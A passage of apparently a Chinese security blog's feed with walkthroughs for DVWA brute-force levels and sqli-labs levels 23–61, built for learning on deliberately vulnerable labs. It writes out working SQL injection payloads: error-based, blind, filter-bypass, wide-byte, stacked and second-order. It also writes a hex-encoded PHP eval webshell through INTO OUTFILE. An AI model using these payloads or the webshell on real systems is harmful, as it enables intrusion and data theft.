src="/2020/12/26/dvwa%E4%BA%8C/6.jpg" alt="6"></p><p>上图是我设置的线程数（线程数主要是设置一些重试时间，开始时间，线程数量等数据），就然后就可以开始破解：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/4.jpg" alt="4"></p><p>length可以对响应包的长度进行排序，找最大或最小的值（<strong>响应报文不一样，密码正确和错误返回的不是同一个响应报文，其长度一般都不同，故找出不同的一项，就可以找出正确的一项</strong>)然后看这个HTTP请求的响应报文：</p><img src="/2020/12/26/dvwa%E4%BA%8C/8.jpg" alt="8" style="zoom:50%;"><p>报文中<code>welcome to the password protected area admin</code>表示成功登录。</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/9.jpg" alt="9"></p><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>查看源码:</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/10.jpg" alt="10"></p><p>对传过来的值，使用了 <code>mysql_real_escape_string()</code> 函数，转义了以下字符：</p><pre><code class="hljs text">\x00 \n \r \ &#x27; &quot; \x1a</code></pre><p>还使用了sleep(2)在密码错误的时候延时两秒：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/11.jpg" alt="11"></p><p>与low等级类似，但转义了很多字符不能再用SQL注入，暴力破解与前面操作一样。</p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>查看源码：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/22.jpg" alt="22"></p><p>发现登录验证时提交了username、password、login、user_token参数，服务器返回登陆页面时包含一个随机的user_token的值，每次登录时都要将user_token一起提交。服务器收到请求后，会先验证token，再进行sql查询。本关还使用了<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">stripslashes</a>函数（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个），<code> mysql_real_escape_string</code>对参数username、password进行过滤、转义,抵御sql注入。还是使用抓包，等学会python再用脚本做一遍。</p><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>burp suite 有四种攻击模式，之前讲到的抓包中都使用狙击手模式，因为只需爆破一个位置，本关需要两个爆破位置故选择草叉模式（草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合)关于攻击模式详细看教程：<a href="https://www.cnblogs.com/diligenceday/p/12316899.html">攻击模式</a></p><h4 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2020/12/26/dvwa%E4%BA%8C/12.jpg" alt="12"></h4><h4 id="设置线程"><a href="#设置线程" class="headerlink" title="设置线程"></a>设置线程</h4><p>因为草叉模式只允许单线程，故线程要设为一。</p><h4 id="设置options"><a href="#设置options" class="headerlink" title="设置options"></a>设置options</h4><p>Grep-Extract提取响应消息中的有用信息，添加设置：</p><img src="/2020/12/26/dvwa%E4%BA%8C/15.jpg" alt="15" style="zoom:50%;"><p>选中value值表示每次从响应中获得该值，将Redirections设置为Always。</p><h4 id="设置payloads"><a href="#设置payloads" class="headerlink" title="设置payloads"></a>设置payloads</h4><p>第一个参数不再赘述</p><img src="/2020/12/26/dvwa%E4%BA%8C/5-1610728925860.jpg" alt="5" style="zoom:50%;"><p>第二个参数</p><img src="/2020/12/26/dvwa%E4%BA%8C/14.jpg" alt="14" style="zoom:50%;"><p>红线部分为options中复制的token值。</p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p><img src="/2020/12/26/dvwa%E4%BA%8C/13.jpg" alt="13"></p><h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p>这个源代码有点复杂：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/16.jpg" alt="16"></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/17.jpg" alt="17"><img src="/2020/12/26/dvwa%E4%BA%8C/18.jpg" alt="18"></p><p>本关一样有token值，但是两个级别最外层的爆破在通过字典尝试不同口令的时候，high只要发POST请求报文，就能从对应的响应报文拿到下次再发POST请求报文时需要用到的user_token。<strong>但impossible只有先发送GET方式的请求报文，才能获取到服务器发回来的一次性user_token。</strong>而GET方式的请求报文，无法提交爆破参数，只能通过POST方式的请求报文来提交爆破所用到的参数，所以需要在BurpSuite里建立一个宏来反复进行操作。</p><h4 id="建立宏"><a href="#建立宏" class="headerlink" title="建立宏"></a>建立宏</h4><p>直接对dvwa靶机的登录界面进行破解，在project options的sessions中添加Macros。</p><p>选择登录页面</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/19.jpg" alt="19"></p><p>选择token后定义参数</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/20.jpg" alt="20"></p><p>在configure item中添加</p><img src="/2020/12/26/dvwa%E4%BA%8C/21.jpg" alt="21" style="zoom:67%;"><p>添加规则时注意描述规则时要将其参数范围定义到所有网址，全局宏定义就结束了</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/23.jpg" alt="23"></p><p>接下来把提交的登录信息的包发送到入侵模块<strong>此时要选择post模式</strong></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/25.jpg" alt="25"></p><p>接下来跟high等级一样但攻击模式要选默认的狙击手模式</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/24.jpg" alt="24"></p><p>爆破成功~~</p><p>impossible和high级别的爆破涉及到登陆返回页面中产生的随机值user_token，在用户登录时要将user_token一起提交。由于user_token可提交报文的方式不同，high和impossible级别的爆破过程也不同。</p><p>至此dvwa的暴力破解就结束了~~</p><p>参考文献：<a href="https://zhuanlan.zhihu.com/p/126639909">DVWA教程之Brute Force（high、impossible）</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(七)</title>
    <link href="/2020/12/17/sqli-labs%E4%B8%83/"/>
    <url>/2020/12/17/sqli-labs%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h1><p>初看页面,考虑到二次注入，查看update的源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/1.jpg" alt="1"></p><p>数据需经函数处理，故不能进行二次注入，再查看login的代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/2.jpg" alt="2"></p><p>密码无函数处理，在密码进行注入<code>a&#39;;create table hi like users#</code></p><p>注入前：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/3.jpg" alt="3"></p><p>注入后:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/4.jpg" alt="4"></p><h1 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h1><p>在之前的MySQL里有介绍查询语句：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]</code>,而46关就与此相关。先看源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/5.jpg" alt="5"></p><p>发现这关使用sort代替id，并且为数字型注入，试改变sort的值：</p><img src="/2020/12/17/sqli-labs%E4%B8%83/6.jpg" alt="6" style="zoom:50%;"><p>在后接上asc(升序)或者desc(降序);</p><img src="/2020/12/17/sqli-labs%E4%B8%83/7.jpg" alt="7" style="zoom:50%;"><p>发现修改order by 后面的参数执行结果不同，推测注入点在<code>order by</code>后的参数中，查询官方文件：<a href="https://dev.mysql.com/doc/refman/8.0/en/select.html">MySQL</a></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/8.jpg" alt="8"></p><p>可利用order by 后参数进行注入。开始尝试：</p><h4 id="法一：报错注入"><a href="#法一：报错注入" class="headerlink" title="法一：报错注入"></a>法一：报错注入</h4><p><code>?sort=1 and updatexml(1,concat(0x7e,database()),1)</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/9.jpg" alt="9"></p><p>也可以用floor():</p><p><code>?sort=(select count(*) from information_schema.schemata group by concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/12.jpg" alt="12"></p><p>也可以用extractvalue():</p><p><code>and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/16.jpg" alt="16"></p><h4 id="法二：时间盲注"><a href="#法二：时间盲注" class="headerlink" title="法二：时间盲注"></a>法二：时间盲注</h4><p><code>and if(left(database(),8)=&#39;security&#39;,sleep(5),1)--+</code></p><img src="/2020/12/17/sqli-labs%E4%B8%83/10.jpg" alt="10" style="zoom:50%;"><p>但是我发现在错误的情况下，休眠时间超过5秒网页还会报错，在数据库里操作:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/11.jpg" alt="11" style="zoom:50%;"><p>好像挺正常的，可是在火狐里就是很诡异，有个说法是添加<code>sleep(N)</code>这个函数后，语句的执行具体会停留多长时间取决于<strong>满足条件的记录数</strong>，MySQL 会对<strong>每条</strong>满足条件的记录停留 N 秒钟，可如果因为这个的话，应该是延时很久，不至于网页报错啊。。。。。。</p><h4 id="法三：rand-函数"><a href="#法三：rand-函数" class="headerlink" title="法三：rand()函数"></a>法三：rand()函数</h4><p>格式：<code>?sort=rand(sql 语句)</code></p><p>rand(true):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/13.jpg" alt="13" style="zoom:50%;"><p>rand(flase):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/15.jpg" alt="15" style="zoom:50%;"><p><code>?sort=rand(left(database(),8)=&#39;security&#39;)</code>:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/14.jpg" alt="14" style="zoom:50%;"><p>页面和true一样，故该语句正确。</p><h4 id="法四-一句话木马"><a href="#法四-一句话木马" class="headerlink" title="法四:一句话木马"></a>法四:一句话木马</h4><p>先介绍一个语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lines terminated by 0x**&#x2F;&#x2F;每行输出以0x**结尾</span><br></pre></td></tr></table></figure><p>接下来要导文件，可能有人会遇到一样的问题，执行导文件命令后报错：The MySQL server is running with the –secure-file-priv option so it cannot execute，需到MySQL命令里查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/17.jpg" alt="17"></p><p>值为null,表示限制mysqld 不允许导入导出，需到MySQL配置文件里更改<code>secure_file_priv =</code>为空白</p><p>再查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/18.jpg" alt="18"></p><p>即可导出文件。 </p><p><code>?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sql\\less-46\\lll.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e --+</code>(<strong>0x一定要记得加，一开始忘记加一直报错。。。</strong>)</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/19.jpg" alt="19"></p><p>在目录里可找到如上文件，连接到蚁剑：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/20.jpg" alt="20"></p><p>47关单引号包裹其余相同，48关除了不报错其余也一样，49关单引号包裹无回显。</p><h1 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h1><p>查源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/21.jpg" alt="21"></p><p>用了mysqli_multi_query()函数：执行一个或多个针对数据库的查询。故可用堆叠注入：</p><p><code>?sort=1; create table hhh like users;</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/22.jpg" alt="22"></p><p>之前的方法仍适用,也可以堆叠方法构造一句话木马。51关单引号包裹其余相同。52关没有回显，其余与50关相同，53关单引号包裹也无回显，其余相同。</p><h1 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h1><p>接下来是进阶学习，这一关主要考察字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。</p><p>盲猜单引号注入：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/23.jpg" alt="23"></p><p>查字段数：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/24.jpg" alt="24"></p><p>爆表:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/25.jpg" alt="25"></p><p>爆列：<img src="/2020/12/17/sqli-labs%E4%B8%83/26.jpg" alt="26"></p><p>爆值:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/27.jpg" alt="27"></p><p>输入密钥：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/28.jpg" alt="28"></p><h1 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h1><p>这关有点奇葩我试了七次才试出闭合方式，居然是数字型的小括号包裹：</p><p><code>?id=1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/29.jpg" alt="29"></p><p>爆表：</p><p><code>?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/30.jpg" alt="30"></p><p>爆列：</p><p><code>?id=0） union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8dzw16d8m5&#39;--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/31.jpg" alt="31"></p><p>爆值：</p><p><code>?id=0) union select 1,2,group_concat(secret_97U6) from challenges.8dzw16d8m5--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/32.jpg" alt="32"></p><p>成功~~:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/33.jpg" alt="33"></p><p>56关为<code>&#39;)</code>包裹，57为双引号包裹。</p><h1 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h1><p>在之前的关卡中报错都被注释，报错注入就不能使用，故前面的操作次数较多，而此关只有五次，查看源代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/34-1608353774465.jpg" alt="34"></p><p>报错没有被注释，故用报错注入。</p><p>单引号包裹：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/35.jpg" alt="35"></p><p>爆表：</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;) ),1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/36.jpg" alt="36"></p><p>爆列:</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where  table_name=&#39;933h2rr0c5&#39; )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/37.jpg" alt="37"></p><p>爆值：</p><p><code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_GJ8R) from challenges.933h2rr0c5 )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/38.jpg" alt="38"></p><p>成功：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/39.jpg" alt="39"></p><p>59数字型注入，60<code>&quot;)</code>包裹，61关值得注意的是它是<code>&#39;))&#39;</code>包裹的，第一遍我试了四次才出来，这个故事告诉我们要打破前面关卡的固有思维。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（六）</title>
    <link href="/2020/12/14/sqli-labs%E5%85%AD/"/>
    <url>/2020/12/14/sqli-labs%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/2.jpg" alt="2"></p><p>这关额外注释了union,select,字符。</p><p>单引号报错，注释掉回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/1.jpg" alt="1"></p><h2 id="法一：联合查询"><a href="#法一：联合查询" class="headerlink" title="法一：联合查询"></a>法一：联合查询</h2><p>将union和select改为大小写混合就可以:</p><p><code>?id=0&#39;%0aUnIoN%0aSeLeCt%0a1,database(),2%0a%26%26%0a&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/3.jpg" alt="3"></p><p>不再赘述</p><h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><p><code>?id=1&#39;%a0||%a0updatexml(1,concat(0x7e,(database())),1) %a0||&#39;1&#39;=&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/4.jpg" alt="4"></p><h2 id="法三：布尔注入"><a href="#法三：布尔注入" class="headerlink" title="法三：布尔注入"></a>法三：布尔注入</h2><p><code>?id=1&#39;%0a%26%26%0aleft((select database()),8)=&#39;security&#39;%26%26&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/5.jpg" alt="5"></p><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><p>试探出双引号注入：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/6.jpg" alt="6"></p><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/7.jpg" alt="7"></p><p>注释报错，不能用报错注入，步骤类似，不再赘述。</p><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>单引号报错，单引号加括号也报错,将其分别注释：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/9.jpg" alt="9"></p><p>回显正常</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/10.jpg" alt="10"></p><p>回显正常？？将单引号闭合的id换掉：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/11.jpg" alt="11"></p><p>发现回显是id为1的用户，故判断为<code>&#39;)&#39;</code>注入。也可以用<code>;%00</code>注释可避免这个问题。</p><p>查源码：<img src="/2020/12/14/sqli-labs%E5%85%AD/8.jpg" alt="8"></p><p>少了 and和 or的注释，过滤了相连的<code>union</code>和<code>select</code>，正则表达式中\s表示匹配一个空格，也能匹配包括tab键等任意空白字符如制表符、换行符、空格等，因此%0a换行符也被匹配了，只能使用%a0来绕过，<code>/i</code>同时匹配大小写，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，  过滤了两次空格，过滤了<code>/</code>没过滤<code>\</code>，其余步骤类似：</p><p><code>?id=0&#39;)%a0uniOn%a0sElEct%a01,database(),3%a0or%a0(&#39;1&#39;)=(&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/12.jpg" alt="12"></p><p>不再赘述。</p><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/13.jpg" alt="13"></p><p>少了很多注释</p><p><code>?id=0&#39;) uniOn%a0sElEct 1,database(),3 or (&#39;1&#39;)=(&#39;1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/14.jpg" alt="14"></p><p>不再赘述</p><h1 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h1><p>正常开始打，发现它与第1关一样，查了教程这一次29-32关在其他地方，同时还需要配置jspstudy环境,推荐教程：<a href="https://www.cnblogs.com/heiwa-0924/p/12369438.html">Less-29</a>,注意：<strong>jspstudy的端口问题，不与PHPstudy共用80，否则会冲突</strong>设置好变量后出现如下页面:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/15.jpg" alt="15"></p><p>补充知识:</p><h2 id="服务器（两层）架构"><a href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><img src="/2020/12/14/sqli-labs%E5%85%AD/16.jpg" style="zoom: 67%;"><p>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程如上图，apache解析最后一个参数，Tomcat（jsp）解析第一个参数。tomcat服务器处做数据过滤和处理，功能类似为一个WAF。因为解析参数的不同，我们可以利用该原理绕过WAF的检测。该用法就是http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。推荐教程：<a href="https://www.cnblogs.com/lcamry/p/5762961.html">服务器两层架构</a></p><p>单引号报错：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/17.jpg" alt="17"></p><p>注释后回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/18.jpg" alt="18"></p><p>不再赘述。</p><h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><p>登录，发现转义</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/19.jpg" alt="19"></p><p>查看源码:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/21.jpg" alt="21"></p><p>此关为宽字节注入，在之前文章SQL基础里有介绍，推荐解码网站：<a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">GBK解码</a>，</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>添加%df,构造宽字节注入漏洞：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/20.jpg" alt="20" style="zoom: 33%;"><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>%5c表示\ ，如果能将返回的结果中对于单引号没有转义字符进行处理，如用字母组合使其形成宽字节，从而使\（斜杠）失效，也可达到宽字节漏洞，例如用%c’ccc和%5c进行组合，这里hh可随意。</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/22.jpg" alt="22"></p><p>效果如下:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/23.jpg" alt="23"></p><p>不再赘述。</p><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>单引号仍出现转义，查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/24.jpg" alt="24"></p><p>这一关使用的是addslashes()函数过滤。</p><p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<strong>PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。因此不应对已转义过的字符串使用  addslashes()，这样会导致双层转义</strong></p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><p>登录：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/25.jpg" alt="25"></p><p>还是存在转义，之前的关卡是get型的方式以url形式提交的，因此数据会通过URLencode，而现在是post型。</p><h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>介绍一个新知识(详细教程：<a href="https://blog.csdn.net/guxiaonuan/article/details/78678043">字符编码的概念</a>)</p><p>Unicode 可以使用的编码有三种，分别是：</p><ul><li>UFT-8：一种变长的编码方案，使用 1~6 个字节来存储；</li><li>UFT-32：一种固定长度的编码方案，不管字符编号大小，始终使用 4 个字节来存储；</li><li>UTF-16：介于 UTF-8 和 UTF-32 之间，使用 2 个或者 4 个字节来存储，长度既固定又可变。</li></ul><p>将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为 �’。</p><h4 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h4><p>登录如下：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/26.jpg" alt="26"></p><p>查库：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/27.jpg" alt="27" style="zoom:50%;"><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="/2020/12/14/sqli-labs%E5%85%AD/28.jpg" alt="28"></p><h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>在火狐效仿前几关用%df’宽字节注入：<code>uname=-1%df&#39; &amp;passwd=123&amp;submit=Submit</code>发现不行？？</p><p>抓个包:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/30.jpg" alt="30"></p><p>发现奇奇怪怪的转义，所以只能在burp suite更改：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/29.jpg" alt="29"></p><h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><p>这关有点奇怪，数字型注入还对<code>&#39;</code>转义？？？按照流程正常注入即可，后期遇到<code>&#39;security&#39;</code>在进行编码即可。</p><h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><p>get宽字节注入，换了个函数:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/31.jpg" alt="31"></p><p>对以下字符转义:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- \x00</span><br><span class="line">- \n</span><br><span class="line">- \r</span><br><span class="line">- \</span><br><span class="line">- &#39;</span><br><span class="line">- &quot;</span><br><span class="line">- \x1a</span><br></pre></td></tr></table></figure><p>跟之前一样:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/32.jpg" alt="32"></p><p>or</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/33.jpg" alt="33"></p><p>火狐好像对<code>%df&#39;</code>有恶意，执行会报错，以上是用Microsoft Edge执行的。</p><h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><p>本关与 34 关是大致相似的,post宽字节注入，区别在于处理 post 内容用的是 mysql_real_escape_string()<br> 函数，而不是 addslashes()函数，但是原理是一样的，</p><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><h4 id="Stacked-injection"><a href="#Stacked-injection" class="headerlink" title="Stacked injection"></a>Stacked injection</h4><p>多条sql语句一起执行，和union语句有点像，但是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句，但并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。在web系统中，代码只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面无法看到返回结果。</p><p>源代码：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/34.jpg" alt="34" style="zoom: 80%;"><p>发现多个函数:<a href="https://link.jianshu.com/?t=http://www.runoob.com/php/func-mysqli-more-results.html">PHP mysqli_more_results() 函数</a> <a href="https://link.jianshu.com/?t=http://www.runoob.com/php/func-mysqli-multi-query.html">PHP mysqli_multi_query() 函数</a> <a href="https://link.jianshu.com/?t=http://php.net/manual/zh/mysqli.store-result.php">mysqli_store_result</a>，经查询均与连接数据库有关。</p><p>试探为单引号，进行插入：<code>id=1&#39;;insert into users(id,username,password) values (38,&#39;111&#39;,&#39;222&#39;)--+</code></p><p>查询数据库：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/35.jpg" alt="35"></p><p>成功插入。</p><h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><p>试探为数字型注入，一样的操作</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/36.jpg" alt="36"></p><p>40,41关也一样，少了回显,不赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs五</title>
    <link href="/2020/12/09/sqli-labs%E4%BA%94/"/>
    <url>/2020/12/09/sqli-labs%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>本关跟第一关有点像，但是试探过程中发现<code>id=1&#39;</code>和<code>id=&#39;)</code>报错，但注释后仍报错，而<code>id=1&quot;</code>和<code>id=1&quot;)</code>回显正常，看一下源代码</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/1.jpg" alt="1"></p><p>发现本关对–+和#都进行了转义，故不能再用这种方式注释，可以在之后构造出闭合用;%00(一种特殊的注释符)或者and和or语句进行闭合。通过试探得出该处为单引号注入：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/2.jpg" alt="2"></p><p>其余步骤与第一关相似，在每条语句后面加上<code>and&#39;1&#39;=&#39;1</code>闭合即可。</p><h1 id="Less-24（二次注入）"><a href="#Less-24（二次注入）" class="headerlink" title="Less-24（二次注入）"></a>Less-24（二次注入）</h1><p>二次注入思路：</p><ul><li>先构造语句（有被转义字符的语句或SQL语句）提交 HTTP 数据请求到服务 端进行处理</li><li>服务端保存数据，为应用程序提供原始输入数据并响应客户端请求</li><li>向服务端发送第二个与第一次不相同的请求数据信息</li><li>服务端接收到请求，查询数据库中已经存储的数据信息并处理，从而第一次请求中构造的语句在服务端环境中执行</li><li>服务端返回执行的处理结果数据信息，可以通过返回的结果判断二次注入漏洞利用是否成功</li></ul><p>页面中出现Forgot your password?点进去额……去攻击它???只能点New User click here?注册。</p><p>查看login.php源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/15.jpg" alt="15"></p><p>登录时用户名和密码都被过滤。</p><p>查看login_create.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/16.jpg" alt="16"></p><p>可插入用户名和密码</p><p>pass_change.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/14.jpg" alt="14"></p><p>更改密码时，用户名没有过滤，sql语句中对用户名加了单引号。</p><p>注册用户名为admin’#密码随意：</p><img src="/2020/12/09/sqli-labs%E4%BA%94/17.jpg" alt="17" style="zoom: 50%;"><p>修改密码后使用新密码重新登录，发现无法登录，查看数据库</p><img src="/2020/12/09/sqli-labs%E4%BA%94/18.jpg" alt="18" style="zoom:80%;"><p>发现admin的密码变成了新密码，而原本注册的用户密码不变，因为在创建admin‘#之后，这个账号再次检索的时候不用进行转义检测，所以搜索到的数据库名时admin，并不是admin’#，所以修改的密码也是admin的密码，所以登录的时候，username应该是admin，而不是admin‘#。</p><h1 id="Less-25-绕过注入"><a href="#Less-25-绕过注入" class="headerlink" 